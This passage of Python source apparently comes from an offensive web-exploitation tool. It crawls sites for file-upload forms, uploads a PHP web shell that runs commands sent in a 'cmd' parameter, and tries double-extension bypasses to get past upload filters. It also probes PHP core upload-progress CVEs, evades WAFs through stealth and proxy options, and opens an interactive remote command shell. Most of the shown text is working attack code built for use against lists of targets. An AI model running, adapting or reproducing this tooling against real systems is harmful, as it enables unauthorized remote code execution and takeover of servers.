                f"[dim]PHP fingerprint:[/] {fp.version_raw} "
                f"[dim]patch={fp.patch_status}[/]"
            )
        if profile.sapi != SAPI_UNKNOWN:
            console.print(
                f"[dim]SAPI profile:[/] {profile.sapi} "
                f"[dim]confidence={profile.confidence:.2f}[/] "
                f"[dim]server={profile.server_header or '-'}[/]"
            )
            if profile.hints:
                console.print(f"[dim]  hints: {' | '.join(profile.hints[:3])}[/]")
    config = effective
    if config.strict_cve and fp.patch_status == "patched":
        if not quiet:
            console.print(
                "[green][STRICT-CVE][/] Target PHP is patched — skipping core probes."
            )
        return None

    if config.core_endpoint_only:
        origin = get_origin(target_url)
        probe_urls = [urljoin(origin, urlparse(target_url).path or "/")]
    else:
        probe_urls = iter_core_probe_urls(target_url)

    best: Optional[CoreProbeResult] = None
    for endpoint in probe_urls:
        if not quiet:
            stage_log(f"[dim]Core POST probe[/] {endpoint}")
        result = core_probe_endpoint(session, config, endpoint, fp=fp, profile=profile)
        if result.waf_blocked:
            if not quiet:
                console.print(f"[yellow][WAF BLOCKED][/] core probe {endpoint}")
            continue
        log_core_memory_events(endpoint, result.memory_events, quiet=quiet)
        if result.vulnerable and (
            best is None
            or len(result.signals) > len(best.signals)
            or len(result.memory_events) > len(best.memory_events)
        ):
            best = result
            if not quiet:
                console.print(
                    f"[magenta bold][CORE][/] {endpoint} "
                    f"[dim]cve={result.cve_ids} signals={','.join(result.signals)} "
                    f"sid={result.sid} pad={result.padding_used}[/]"
                )
    if best and best.vulnerable and not quiet:
        render_core_exploit_chain(best)
    return best


def hybrid_vulnerability_check(
    session: requests.Session,
    base_config: PoCConfig,
    target_url: str,
) -> tuple[bool, Optional[ShellSession], bool, Optional[str], Optional[str], Optional[str]]:
    """
    Phase 1: PHP core session.upload_progress probe.
    Phase 2: Application upload discovery + shell marker verification.
    """
    quiet = base_config.quiet
    core = check_php_core_upload_progress(session, base_config, target_url, quiet=quiet)
    if core and core.waf_blocked:
        return False, None, True, None, None, None
    if core and core.vulnerable:
        detail = (
            f"sid={core.sid}; cve={core.cve_ids}; patch={core.patch_status}; "
            f"php={core.php_version}; sapi={core.sapi_type}; "
            f"oom={core.oom_threshold_bytes}; stale={core.stale_state}; "
            f"pad={core.padding_used}; align={core.alignment_used}; "
            f"signals={','.join(core.signals)}; events={','.join(core.memory_events)}"
        )
        shell_hint = f"{core.endpoint}#core/{core.sid}"
        return (
            True,
            ShellSession(shell_url=shell_hint),
            False,
            core.endpoint,
            core.vector,
            detail,
        )

    config, discovered = prepare_target_config(session, base_config, target_url)
    vuln, shell, waf = check_vulnerability(session, config)
    endpoint = discovered or config.target_url
    vector = "app-upload" if vuln else None
    return vuln, shell, waf, endpoint, vector, None


def build_session(config: PoCConfig, *, referer_url: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    session.verify = config.verify_ssl
    referer = (get_origin(referer_url) + "/") if referer_url else "https://localhost/"
    headers = build_browser_headers(referer)
    if config.core_worker_pin:
        headers["Connection"] = "keep-alive"
    session.headers.update(headers)

    retry = Retry(
        total=1 if config.quiet else 2,
        connect=1 if config.quiet else 2,
        read=1 if config.quiet else 2,
        backoff_factor=0.3,
        status_forcelist=(502, 503, 504),
        allowed_methods=("GET", "POST", "HEAD"),
    )
    pool_conn = 1 if config.core_worker_pin else 10
    pool_size = 1 if config.core_worker_pin else 10
    adapter = HTTPAdapter(max_retries=retry, pool_connections=pool_conn, pool_maxsize=pool_size)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    proxy = pick_proxy(config)
    if proxy:
        session.proxies.update(normalize_proxies(proxy))

    return session


def configure_worker_pinning(session: requests.Session) -> None:
    """Single-connection keep-alive pool to pin PHP-FPM/Apache worker (109619 stale chain)."""
    session.headers["Connection"] = "keep-alive"
    retry = Retry(
        total=2,
        connect=2,
        read=2,
        backoff_factor=0.2,
        status_forcelist=(502, 503, 504),
        allowed_methods=("GET", "POST", "HEAD"),
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=1, pool_maxsize=1)
    session.mount("http://", adapter)
    session.mount("https://", adapter)


def normalize_proxies(proxy: str) -> dict[str, str]:
    p = proxy.strip()
    if not p:
        return {}
    if "://" not in p:
        p = f"http://{p}"
    return {"http": p, "https": p}


def log_network_error(exc: Exception, context: str, *, quiet: bool = False) -> None:
    if quiet:
        return
    if isinstance(exc, Timeout):
        console.print(f"[red bold]Timeout[/] ({context}): request exceeded limit.")
    elif isinstance(exc, SSLError):
        console.print(f"[red bold]SSL error[/] ({context}): {exc}")
    elif isinstance(exc, ProxyError):
        console.print(f"[red bold]Proxy error[/] ({context}): {exc}")
    elif isinstance(exc, RequestsConnectionError):
        console.print(f"[red bold]Connection failed[/] ({context}): {exc}")
    else:
        console.print(f"[red bold]Request error[/] ({context}): {exc}")


def safe_request(
    session: requests.Session,
    method: str,
    url: str,
    *,
    context: str,
    timeout: float,
    quiet: bool = False,
    config: Optional[PoCConfig] = None,
    **kwargs: Any,
) -> Optional[requests.Response]:
    try:
        if config is not None:
            apply_stealth_session(session, config, url)
        return session.request(method, url, timeout=timeout, **kwargs)
    except (Timeout, SSLError, ProxyError, RequestsConnectionError) as exc:
        log_network_error(exc, context, quiet=quiet)
        return None
    except requests.RequestException as exc:
        log_network_error(exc, context, quiet=quiet)
        return None


def build_payload(mode: str, token: Optional[str] = None) -> bytes:
    if mode == "check":
        marker = token or CHECK_MARKER
        php = f"<?php echo '{marker}'; ?>"
    elif mode == "exec":
        php = "<?php if(isset($_REQUEST['cmd'])){ @system($_REQUEST['cmd']); } ?>"
    else:
        raise ValueError(f"unknown payload mode: {mode}")
    return php.encode("utf-8")


def iter_upload_filenames(token: str, ext: str, double_ext_bypass: bool) -> list[str]:
    base = f"shell_{token}"
    names = [f"{base}{ext}"]
    if not double_ext_bypass:
        return names
    if ext.lower() in (".php", ".php5", ".phtml", ".phar"):
        names.extend(
            [
                f"{base}.jpg{ext}",
                f"{base}{ext}.jpg",
                f"{base}.png{ext}",
                f"{base}{ext.upper()}",
            ]
        )
    return list(dict.fromkeys(names))


def resolve_shell_url(config: PoCConfig, basename: str) -> str:
    if config.shell_path_hint:
        return urljoin(config.target_url, config.shell_path_hint.lstrip("/"))
    upload_path = urlparse(config.target_url).path
    base_dir = upload_path.rsplit("/", 1)[0] + "/" if "/" in upload_path else "/"
    origin = f"{urlparse(config.target_url).scheme}://{urlparse(config.target_url).netloc}"
    return urljoin(origin + base_dir, basename)


def normalize_shell_href(href: str, origin: str, page_url: str) -> Optional[str]:
    href = href.strip()
    if not href or href.startswith(("javascript:", "data:")):
        return None
    if href.startswith("//"):
        scheme = urlparse(origin).scheme
        return f"{scheme}:{href}"
    if href.startswith("http://") or href.startswith("https://"):
        return href
    return urljoin(page_url, href)


def extract_shell_urls_from_response(body: str, filename: str, origin: str, page_url: str) -> list[str]:
    if not body:
        return []
    found: list[str] = []
    patterns = (
        rf"https?://[^\s\"'<>]+{re.escape(filename)}",
        rf"[\"'](/[^\s\"'<>]*{re.escape(filename)})[\"']",
        rf"[\"']((?:\./|\../)[^\s\"'<>]*{re.escape(filename)})[\"']",
        rf"(?:url|file|path|src|href)\s*[:=]\s*[\"']([^\"']*{re.escape(filename)})[\"']",
        rf"\\?[\"']([^\"']*{re.escape(filename)})[\"']",
    )
    for pattern in patterns:
        for match in re.finditer(pattern, body, re.I):
            raw = match.group(1) if match.lastindex else match.group(0)
            url = normalize_shell_href(raw, origin, page_url)
            if url and filename.lower() in url.lower():
                found.append(url)
    return list(dict.fromkeys(found))


def build_shell_probe_urls(
    filename: str,
    config: PoCConfig,
    hinted_urls: Optional[list[str]] = None,
) -> list[str]:
    origin = get_origin(config.target_url)
    handler_path = urlparse(config.target_url).path
    handler_dir = handler_path.rsplit("/", 1)[0] + "/" if "/" in handler_path else "/"

    dirs = [
        handler_dir,
        "/uploads/",
        "/upload/",
        "/files/",
        "/wp-content/uploads/",
        "/media/",
        "/images/",
        "/storage/",
        "/data/uploads/",
        "/public/uploads/",
        "/content/uploads/",
        "/",
    ]
    generated: list[str] = []
    for directory in dirs:
        generated.append(urljoin(origin + directory, filename))

    urls: list[str] = []
    for item in (hinted_urls or []) + generated:
        if item not in urls:
            urls.append(item)
    primary = resolve_shell_url(config, filename)
    if primary not in urls:
        urls.insert(0, primary)
    return urls


def upload_payload(
    session: requests.Session,
    config: PoCConfig,
    payload: bytes,
    filename: str,
) -> tuple[bool, list[str], bool, str]:
    files = {config.upload_field: (filename, payload, "application/octet-stream")}
    data = dict(config.extra_form or {})

    resp = safe_request(
        session,
        "POST",
        config.target_url,
        context=f"upload -> {config.target_url}",
        timeout=config.timeout,
        quiet=config.quiet,
        config=config,
        files=files,
        data=data,
        allow_redirects=True,
    )
    if resp is None:
        return False, [], False, ""

    body = resp.text or ""
    if is_waf_blocked(resp.status_code, body):
        return False, [], True, body

    if not config.quiet and resp.status_code not in (200, 201, 204, 302):
        console.print(
            f"[yellow]Upload returned HTTP {resp.status_code}[/] — probing resolved paths."
        )

    origin = get_origin(config.target_url)
    hinted = extract_shell_urls_from_response(body, filename, origin, config.target_url)
    probe_urls = build_shell_probe_urls(filename, config, hinted)
    return True, probe_urls, False, body


def extract_marker_from_body(body: str, marker: str) -> bool:
    if marker not in body:
        return False
    if looks_like_static_php_leak(body, marker=marker):
        return False
    return True


def looks_like_static_php_leak(
    body: str,
    *,
    marker: Optional[str] = None,
    content_type: Optional[str] = None,
    content_disposition: Optional[str] = None,
) -> bool:
    """True when the server serves uploaded PHP as a static file (no interpreter)."""
    if not body:
        return False
    text = body.strip()
    if content_disposition and re.search(r"attachment", content_disposition, re.I):
        return True
    ct = (content_type or "").lower()
    if "application/octet-stream" in ct and re.search(r"<\?php", text, re.I):
        return True
    if not re.search(r"<\?php", text, re.I):
        return False
    if marker and re.search(
        rf"<\?php\s+echo\s+['\"]{re.escape(marker)}['\"]",
        text,
        re.I,
    ):
        return True
    if re.search(r"<\?php\s+if\s*\(\s*isset\s*\(\s*\$_REQUEST\s*\[\s*['\"]cmd['\"]", text, re.I):
        return True
    if len(text) < 2048 and text.count("<?php") == 1 and "?>" in text:
        return True
    return False


def marker_executed_in_body(body: str, marker: str) -> bool:
    if marker not in body:
        return False
    return not looks_like_static_php_leak(body, marker=marker)


def clean_command_output(raw: str, marker: Optional[str] = None) -> str:
    if not raw:
        return ""
    text = raw
    if marker and marker in text:
        text = text.replace(marker, "")
    text = re.sub(r"(?is)<script.*?>.*?</script>", "", text)
    text = re.sub(r"(?is)<style.*?>.*?</style>", "", text)
    text = re.sub(r"(?i)<br\s*/?>", "\n", text)
    text = re.sub(r"(?i)</p\s*>", "\n", text)
    text = re.sub(r"<[^>]+>", "", text)
    text = re.sub(r"&nbsp;", " ", text)
    text = re.sub(r"&lt;", "<", text)
    text = re.sub(r"&gt;", ">", text)
    text = re.sub(r"&amp;", "&", text)
    lines = [ln.rstrip() for ln in text.splitlines()]
    while lines and not lines[0].strip():
        lines.pop(0)
    while lines and not lines[-1].strip():
        lines.pop()
    return "\n".join(lines)


def probe_shell_url(
    session: requests.Session,
    shell_url: str,
    *,
    timeout: float,
    config: PoCConfig,
    quiet: bool = False,
    expect: Optional[str] = None,
) -> tuple[bool, str]:
    resp = safe_request(
        session,
        "GET",
        shell_url,
        context=f"probe shell -> {shell_url}",
        timeout=timeout,
        quiet=quiet,
        config=config,
    )
    if resp is None:
        return False, ""
    body = resp.text or ""
    if is_waf_blocked(resp.status_code, body):
        return False, body
    static = looks_like_static_php_leak(
        body,
        marker=expect,
        content_type=resp.headers.get("Content-Type"),
        content_disposition=resp.headers.get("Content-Disposition"),
    )
    if static:
        if not quiet:
            console.print(
                f"[yellow][STATIC SHELL][/] {shell_url} — PHP source returned "
                f"({resp.headers.get('Content-Type', 'unknown')}), not executed."
            )
        return False, body
    if expect is not None:
        if marker_executed_in_body(body, expect):
            return True, body
        return False, body
    if resp.status_code >= 400:
        return False, body
    return len(body.strip()) > 0, body


def check_vulnerability(
    session: requests.Session,
    config: PoCConfig,
) -> tuple[bool, Optional[ShellSession], bool]:
    token = uuid.uuid4().hex[:8]
    marker = f"{CHECK_MARKER}_{token}"
    waf_blocked = False

    for ext in config.extensions:
        payload = build_payload("check", token=marker)
        for filename in iter_upload_filenames(token, ext, config.double_ext_bypass):
            if not config.quiet:
                console.print(f"[cyan]Trying upload[/] as [bold]{filename}[/] ...")

            ok, probe_urls, waf, upload_body = upload_payload(session, config, payload, filename)
            if waf:
                waf_blocked = True
            if not ok or not probe_urls:
                continue

            if extract_marker_from_body(upload_body, marker):
                shell_guess = probe_urls[0]
                if not config.quiet:
                    console.print(
                        f"[green bold]Vulnerable[/] {config.target_url} "
                        "(marker echoed in upload response)."
                    )
                return True, ShellSession(shell_url=shell_guess), False

            for url_candidate in probe_urls:
                found, body = probe_shell_url(
                    session,
                    url_candidate,
                    timeout=config.timeout,
                    config=config,
                    quiet=config.quiet,
                    expect=marker,
                )
                if is_waf_blocked(403, body) or is_waf_blocked(503, body):
                    waf_blocked = True
                    continue
                if found:
                    if not config.quiet:
                        console.print(
                            Panel(
                                f"[green bold]Vulnerable[/]\nShell URL: {url_candidate}",
                                title="Check mode",
                                border_style="green",
                            )
                        )
                    return True, ShellSession(shell_url=url_candidate), False

    if not config.quiet:
        if waf_blocked:
            console.print(
                f"[bold yellow][WAF BLOCKED][/] {config.target_url} "
                "(403/503 — Cloudflare / firewall signature detected)"
            )
        else:
            console.print("[red]Not vulnerable[/] or upload path could not be resolved.")
    return False, None, waf_blocked


def execute_command(
    session: requests.Session,
    shell: ShellSession,
    command: str,
    *,
    timeout: float,
    config: PoCConfig,
    quiet: bool = False,
) -> Optional[str]:
    if not command.strip():
        return ""
    resp = safe_request(
        session,
        "GET",
        shell.shell_url,
        context="execute command",
        timeout=timeout,
        quiet=quiet,
        config=config,
        params={shell.param: command},
    )
    if resp is None:
        return None
    body = resp.text or ""
    if looks_like_static_php_leak(
        body,
        content_type=resp.headers.get("Content-Type"),
        content_disposition=resp.headers.get("Content-Disposition"),
    ):
        if not quiet:
            console.print(
                "[yellow][STATIC SHELL][/] Command param ignored — server returns raw "
                ".phtml bytes (common on FastDFS/static upload mirrors)."
            )
        return None
    out = clean_command_output(body)
    if not out.strip() and re.search(r"<\?php", body, re.I):
        if not quiet:
            console.print(
                "[yellow]Response is PHP source, not command output — interpreter "
                "not running on this URL.[/]"
            )
        return None
    return out


def deploy_exec_shell(
    session: requests.Session,
    config: PoCConfig,
    shell: ShellSession,
) -> bool:
    basename = urlparse(shell.shell_url).path.rsplit("/", 1)[-1]
    payload = build_payload("exec")
    ok, _, _waf, _body = upload_payload(session, config, payload, basename)
    if not ok:
        if not config.quiet:
            console.print("[yellow]Exec payload upload failed; shell may still be check-only.[/]")
        return False
    exec_token = f"PHP2SHELL_EXEC_{uuid.uuid4().hex[:8]}"
    resp = safe_request(
        session,
        "GET",
        shell.shell_url,
        context="verify exec shell",
        timeout=config.timeout,
        quiet=True,
        config=config,
        params={shell.param: f"echo {exec_token}"},
    )
    if resp is None:
        return False
    body = resp.text or ""
    if looks_like_static_php_leak(
        body,
        content_type=resp.headers.get("Content-Type"),
        content_disposition=resp.headers.get("Content-Disposition"),
    ):
        return False
    return exec_token in body and "<?php" not in body


def interactive_shell(
    session: requests.Session,
    shell: ShellSession,
    *,
    timeout: float,
    config: PoCConfig,
) -> None:
    console.print(
        Panel(
            "Interactive mode — type [bold]exit[/] or [bold]quit[/] to leave.",
            border_style="blue",
        )
    )
    while True:
        try:
            command = console.input("[bold magenta]cmd >[/] ").strip()
        except (EOFError, KeyboardInterrupt):
            console.print()
            break
        if command.lower() in ("exit", "quit"):
            break
        if not command:
            continue
        out = execute_command(session, shell, command, timeout=timeout, config=config)
        if out is None:
            console.print("[red]Command failed (network or shell unreachable).[/]")
            continue
        if out:
            console.print(out)
        else:
            console.print("[dim](no output)[/]")


def run_core_chain_exploit_only(
    session: requests.Session,
    config: PoCConfig,
    command: Optional[str],
) -> int:
    """Fast path: one core probe + poison/LFI/auto-LFI (no app upload pass)."""
    stage_log("[cyan]Core chain exploit[/] (fast path — no upload wordlist scan)")
    core = check_php_core_upload_progress(session, config, config.target_url, quiet=False)
    if not core or not core.vulnerable:
        console.print("[red]Core surface not confirmed — aborting chain.[/]")
        return 1
    chain = run_core_chain_exploit(
        session,
        config,
        config.target_url,
        core,
        command or "id",
    )
    if chain.success and chain.output:
        emit_command_output(chain.output)
        return 0
    if chain.success:
        console.print("[yellow]Chain OK but command output not verified.[/]")
    return 1


def run_exploit(
    session: requests.Session,
    config: PoCConfig,
    shell: Optional[ShellSession],
    command: Optional[str],
) -> int:
    active = shell
    if active is None and config.core_chain_exploit:
        return run_core_chain_exploit_only(session, config, command)

    if active is None:
        stage_log("[cyan]Hybrid check (core -> app) + exploit...[/]")
        vuln, active, waf, endpoint, vector, core_detail = hybrid_vulnerability_check(
            session, config, config.target_url
        )
        if waf:
            console.print(
                "[bold yellow][WAF BLOCKED][/] Upload/check blocked by firewall or CDN."
            )
            return 2
        if not vuln or active is None:
            console.print(
                Panel(
                    "[red bold]Exploit failed[/] — shell could not be uploaded or verified.\n\n"
                    f"Handler: [cyan]{config.target_url}[/]\n"
                    f"Field: [cyan]{config.upload_field}[/]\n\n"
                    "[dim]WordPress async-upload.php usually requires an authenticated "
                    "wp-admin session (Cookie) and field [bold]async-upload[/]. "
                    "Try --check first, or --form / --field / Burp cookie.[/]",
                    title="Single-target exploit",
                    border_style="red",
                )
            )
            return 1
        if vector == "core-session-upload-progress":
            if config.core_chain_exploit:
                core = check_php_core_upload_progress(
                    session, config, config.target_url, quiet=False
                )
                if not core or not core.vulnerable:
                    console.print("[red]Core chain aborted — surface not reconfirmed.[/]")
                    return 1
                chain = run_core_chain_exploit(
                    session,
                    config,
                    config.target_url,
                    core,
                    command or "id",
                )
                if chain.success and chain.output:
                    emit_command_output(chain.output)
                    return 0
                if chain.success:
                    console.print("[yellow]Chain reported success but no verified command output.[/]")
                return 1
            console.print(
                Panel(
                    "[yellow bold]PHP core exploit surface[/]\n\n"
                    f"Endpoint: [cyan]{endpoint}[/]\n"
                    f"Detail: [dim]{core_detail or 'n/a'}[/]\n\n"
                    "[dim]Enable [bold]--core-chain[/] with optional "
                    "[bold]--lfi-url[/] (FUZZ), [bold]--core-fpm-two-step[/], "
                    "[bold]--core-timing[/], [bold]--core-heap-spray[/].[/]",
                    title="Core CVE engine",
                    border_style="yellow",
                )
            )
            return 1
        app_config, _ = prepare_target_config(session, config, config.target_url)
        if not deploy_exec_shell(session, app_config, active):
            console.print("[red]Could not deploy exec payload.[/]")
            return 1
        config = app_config
    elif config.target_url:
        deploy_exec_shell(session, config, active)

    if command:
        out = execute_command(session, active, command, timeout=config.timeout, config=config)
        if out is None:
            console.print(
                Panel(
                    "[red bold]No command execution[/]\n\n"
                    f"Shell URL: [cyan]{active.shell_url}[/]\n\n"
                    "Upload succeeded but the file is served as static content "
                    "(e.g. FastDFS group1/default/…). The check marker matched "
                    "inside downloaded source, not executed PHP.\n\n"
                    "[dim]This is not RCE — report as unrestricted file upload only.[/]",
                    title="Exploit",
                    border_style="red",
                )
            )
            return 1
        console.print(out if out else "[dim](empty command output)[/]")
        return 0

    interactive_shell(session, active, timeout=config.timeout, config=config)
    return 0


def normalize_target_url(line: str) -> Optional[str]:
    raw = line.strip()
    if not raw or raw.startswith("#"):
        return None
    if not raw.startswith(("http://", "https://")):
        raw = f"https://{raw}"
    if raw.endswith("/") is False and urlparse(raw).path in ("", "/"):
        raw = raw.rstrip("/") + "/"
    return raw


def load_targets_from_file(path: str) -> list[str]:
    targets: list[str] = []
    seen: set[str] = set()
    text = Path(path).read_text(encoding="utf-8", errors="replace")
    for line in text.splitlines():
        url = normalize_target_url(line)
        if url and url not in seen:
            seen.add(url)
            targets.append(url)
    return targets


def get_origin(url: str) -> str:
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def is_root_like_url(url: str) -> bool:
    parsed = urlparse(url)
    return (parsed.path or "/").rstrip("/") == ""


def join_origin_path(origin: str, path: str) -> str:
    normalized = path if path.startswith("/") else f"/{path}"
    return urljoin(origin.rstrip("/") + "/", normalized.lstrip("/"))


def load_endpoint_wordlist(path: Optional[str]) -> tuple[str, ...]:
    if not path:
        return DEFAULT_ENDPOINT_PATHS
    paths: list[str] = []
    text = Path(path).read_text(encoding="utf-8", errors="replace")
    for line in text.splitlines():
        raw = line.strip()
        if not raw or raw.startswith("#"):
            continue
        if not raw.startswith("/"):
            raw = f"/{raw}"
        paths.append(raw)
    return tuple(paths) if paths else DEFAULT_ENDPOINT_PATHS


def is_static_storage_path(path: str) -> bool:
    normalized = (path or "/").lower()
    if "wp-content/uploads" in normalized:
        return True
    if STATIC_STORAGE_PATH.search(normalized):
        if normalized.rstrip("/").endswith(HANDLER_SCRIPT_EXTENSIONS):
            return False
        if normalized.endswith("/") or normalized.split("/")[-1] in (
            "uploads",
            "files",
            "media",
            "images",
            "assets",
            "static",
            "storage",
        ):
            return True
    return False


def is_upload_handler_path(path: str) -> bool:
    if is_static_storage_path(path):
        return False
    lower = (path or "").lower()
    if lower.endswith(HANDLER_SCRIPT_EXTENSIONS):
        return True
    if lower.endswith("/"):
        return False
    return any(token in lower for token in ("upload", "async-upload", "fileupload", "uploader"))


def filter_handler_wordlist(paths: tuple[str, ...]) -> tuple[str, ...]:
    return tuple(p for p in paths if is_upload_handler_path(p))


def _parse_forms_regex(html: str, page_url: str) -> list[UploadHandler]:
    handlers: list[UploadHandler] = []
    for form_match in re.finditer(r"(?is)<form\b([^>]*)>(.*?)</form>", html):
        attrs = form_match.group(1)
        inner = form_match.group(2)
        enctype = re.search(r'enctype\s*=\s*["\']([^"\']+)["\']', attrs, re.I)
        enctype_val = (enctype.group(1) if enctype else "").lower()
        file_input = re.search(
            r'<input\b[^>]*type\s*=\s*["\']file["\'][^>]*>',
            inner,
            re.I,
        )
        if not file_input and "multipart/form-data" not in enctype_val:
            continue
        if not file_input:
            continue
        tag = file_input.group(0)
        name_match = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
        if not name_match:
            continue
        file_field = name_match.group(1)
        action_match = re.search(r'action\s*=\s*["\']([^"\']*)["\']', attrs, re.I)
        action = action_match.group(1) if action_match else page_url
        action_url = urljoin(page_url, action)
        if is_static_storage_path(urlparse(action_url).path):
            continue
        method_match = re.search(r'method\s*=\s*["\']([^"\']+)["\']', attrs, re.I)
        method = (method_match.group(1) if method_match else "POST").upper()
        hidden: dict[str, str] = {}
        for hidden_match in re.finditer(
            r'<input\b[^>]*type\s*=\s*["\']hidden["\'][^>]*>',
            inner,
            re.I,
        ):
            htag = hidden_match.group(0)
            hn = re.search(r'name\s*=\s*["\']([^"\']+)["\']', htag, re.I)
            hv = re.search(r'value\s*=\s*["\']([^"\']*)["\']', htag, re.I)
            if hn:
                hidden[hn.group(1)] = hv.group(1) if hv else ""
        handlers.append(
            UploadHandler(
                url=action_url,
                file_field=file_field,
                method=method if method in ("POST", "PUT") else "POST",
                form_fields=hidden,
                source="html-form",
                priority=0,
                path=urlparse(action_url).path,
            )
        )
    return handlers


def parse_multipart_forms(html: str, page_url: str) -> list[UploadHandler]:
    if not html:
        return []
    if _HAS_BS4 and BeautifulSoup is not None:
        try:
            soup = BeautifulSoup(html, "html.parser")
            handlers: list[UploadHandler] = []
            for form in soup.find_all("form"):
                enctype = (form.get("enctype") or "").lower()
                file_input = form.find("input", attrs={"type": "file"})
                if not file_input and "multipart/form-data" not in enctype:
                    continue
                if not file_input:
                    continue
                file_field = file_input.get("name")
                if not file_field:
                    continue
                action = form.get("action") or page_url
                action_url = urljoin(page_url, action)
                if is_static_storage_path(urlparse(action_url).path):
                    continue
                method = (form.get("method") or "POST").upper()
                hidden: dict[str, str] = {}
                for inp in form.find_all("input"):
                    itype = (inp.get("type") or "text").lower()
                    iname = inp.get("name")
                    if not iname or iname == file_field:
                        continue
                    if itype in ("hidden", "text", "number"):
                        hidden[iname] = inp.get("value") or ""
                handlers.append(
                    UploadHandler(
                        url=action_url,
                        file_field=file_field,
                        method=method if method in ("POST", "PUT") else "POST",
                        form_fields=hidden,
                        source="html-form",
                        priority=0,
                        path=urlparse(action_url).path,
                    )
                )
            return handlers
        except Exception:
            pass
    return _parse_forms_regex(html, page_url)


def fetch_page_html(
    session: requests.Session,
    url: str,
    config: PoCConfig,
    timeout: float,
) -> Optional[str]:
    resp = safe_request(
        session,
        "GET",
        url,
        context=f"crawl {url}",
        timeout=timeout,
        quiet=True,
        config=config,
        allow_redirects=True,
    )
    if resp is None or is_waf_blocked(resp.status_code, resp.text):
        return None
    if resp.status_code >= 400:
        return None
    return resp.text or ""


def crawl_forms_on_site(
    session: requests.Session,
    base_url: str,
    config: PoCConfig,
) -> list[UploadHandler]:
    origin = get_origin(base_url)
    seeds = [base_url] if not is_root_like_url(base_url) else [join_origin_path(origin, p) for p in DISCOVERY_CRAWL_PATHS]
    seen_pages: set[str] = set()
    handlers: list[UploadHandler] = []
    for page_url in seeds:
        if page_url in seen_pages:
            continue
        seen_pages.add(page_url)
        html = fetch_page_html(session, page_url, config, config.discovery_probe_timeout)
        if not html:
            continue
        seen_form_keys: set[tuple[str, str]] = set()
        for handler in parse_multipart_forms(html, page_url):
            key = (handler.url, handler.file_field)
            if key in seen_form_keys:
                continue
            seen_form_keys.add(key)
            handlers.append(handler)
    return handlers


def classify_wordlist_handler(status: int, body: str, path: str) -> bool:
    if is_waf_blocked(status, body):
        return False
    if not is_upload_handler_path(path):
        return False
    if status in (404, 410) or status >= 500:
        return False
    if status in (200, 401, 403, 405):
        return True
    if body and UPLOAD_BODY_HINTS.search(body):
        return True
    return False


def probe_wordlist_handler(
    session: requests.Session,
    origin: str,
    path: str,
    index: int,
    timeout: float,
    config: PoCConfig,
) -> Optional[UploadHandler]:
    if not is_upload_handler_path(path):
        return None
    url = join_origin_path(origin, path)
    resp = safe_request(
        session,
        "GET",
        url,
        context=f"discovery GET {url}",
        timeout=timeout,
        quiet=True,
        config=config,
        allow_redirects=True,
    )
    if resp is None:
        return None
    status = resp.status_code
    body = (resp.text or "")[:12000]
    if not classify_wordlist_handler(status, body, path):
        return None

    forms = parse_multipart_forms(body, url)
    if forms:
        best = forms[0]
        return replace(
            best,
            source="wordlist+html",
            priority=10 + index,
            status=status,
            path=path,
        )

    field_name = infer_upload_field_from_path(path) or config.upload_field
    return UploadHandler(
        url=url,
        file_field=field_name,
        source="wordlist",
        priority=50 + index,
        path=path,
        status=status,
    )


def log_discovery_hit(
    original_url: str,
    handler: UploadHandler,
    log_path: Optional[str],
    *,
    quiet_console: bool = False,
) -> None:
    if not quiet_console:
        with _io_lock:
            console.print(
                f"[cyan bold][DISCOVER][/] {get_origin(original_url)} "
                f"[dim]->[/] {handler.url} "
                f"[dim](field={handler.file_field}, source={handler.source}, HTTP {handler.status})[/]"
            )
    if log_path and log_path != "-":
        append_line_locked(
            log_path,
            f"{original_url}\t{handler.url}\t{handler.status}\t{handler.path}\t"
            f"{handler.file_field}\t{handler.source}",
        )


def discover_upload_handler(
    session: requests.Session,
    base_url: str,
    config: PoCConfig,
    *,
    quiet_console: bool = False,
) -> Optional[UploadHandler]:
    if not config.auto_discovery:
        return None

    candidates: list[UploadHandler] = []

    try:
        candidates.extend(crawl_forms_on_site(session, base_url, config))
    except Exception:
        pass

    origin = get_origin(base_url)
    handler_paths = filter_handler_wordlist(config.endpoint_paths)
    work_items = list(enumerate(handler_paths))
    if work_items:
        workers = max(1, min(config.discovery_path_threads, len(work_items)))
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = [
                pool.submit(
                    probe_wordlist_handler,
                    session,
                    origin,
                    path,
                    idx,
                    config.discovery_probe_timeout,
                    config,
                )
                for idx, path in work_items
            ]
            for future in as_completed(futures):
                try:
                    hit = future.result()
                except Exception:
                    continue
                if hit:
                    candidates.append(hit)

    if not candidates:
        return None

    deduped: list[UploadHandler] = []
    seen: set[tuple[str, str]] = set()
    for item in sorted(candidates, key=lambda h: (h.priority, h.path)):
        key = (item.url, item.file_field)
        if key in seen:
            continue
        seen.add(key)
        deduped.append(item)

    best = deduped[0]
    log_discovery_hit(base_url, best, config.discovery_log, quiet_console=quiet_console)
    return best


def infer_upload_field_from_path(path: str) -> Optional[str]:
    lower = (path or "").lower()
    if "async-upload.php" in lower:
        return "async-upload"
    if "admin-ajax.php" in lower:
        return "async-upload"
    return None


def apply_upload_handler(base_config: PoCConfig, handler: UploadHandler) -> PoCConfig:
    merged_form = dict(handler.form_fields)
    if base_config.extra_form:
        merged_form.update(base_config.extra_form)
    return replace(
        base_config,
        target_url=handler.url,
        upload_field=handler.file_field,
        extra_form=merged_form or None,
    )


def prepare_target_config(
    session: requests.Session,
    base_config: PoCConfig,
    target_url: str,
    *,
    quiet_console: bool = False,
) -> tuple[PoCConfig, Optional[str]]:
    if not is_root_like_url(target_url):
        html = fetch_page_html(
            session,
            target_url,
            base_config,
            base_config.discovery_probe_timeout,
        )
        if html:
            forms = parse_multipart_forms(html, target_url)
            if forms:
                config = apply_upload_handler(base_config, forms[0])
                return config, forms[0].url

        inferred = infer_upload_field_from_path(urlparse(target_url).path)
        if inferred:
            handler = UploadHandler(
                url=target_url,
                file_field=inferred,
                source="known-cms",
                priority=5,
                path=urlparse(target_url).path,
            )
            config = apply_upload_handler(base_config, handler)
            return config, target_url

    if is_root_like_url(target_url) or base_config.auto_discovery:
        handler = discover_upload_handler(
            session,
            target_url,
            base_config,
            quiet_console=quiet_console,
        )
        if handler:
            config = apply_upload_handler(base_config, handler)
            return config, handler.url

    config = replace(base_config, target_url=target_url)
    return config, None


